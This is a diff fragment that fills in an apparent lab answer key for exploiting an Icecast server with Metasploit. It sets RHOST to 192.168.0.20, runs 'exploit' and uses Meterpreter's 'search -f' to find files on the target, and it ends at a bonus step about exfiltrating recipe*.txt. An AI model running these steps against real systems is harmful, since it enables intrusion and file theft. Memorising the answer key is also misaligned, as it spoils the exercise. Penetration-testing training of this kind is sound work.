@@ -36,23 +36,23 @@
  
    - Run the command that sets the `RHOST`:
       
-     > Answer: 
+     > Answer: `show options` `set rhost 192.168.0.20` `show options`
  
 6. Run the Icecast exploit.
  
    - Run the command that runs the Icecast exploit.
       
-     > Answer: 
+     > Answer: `exploit`
  
    - Run the command that performs a search for the `secretfile.txt` on the target.
       
-     > Answer: 
+     > Answer: `search -f secretfile.txt`
   
  7. You should now have a Meterpreter session open.
  
     - Run the command to performs a search for the `recipe.txt` on the target:
 
-      > Answer: 
+      > Answer:  
  
  
     - **Bonus**: Run the command that exfiltrates the `recipe*.txt` file:
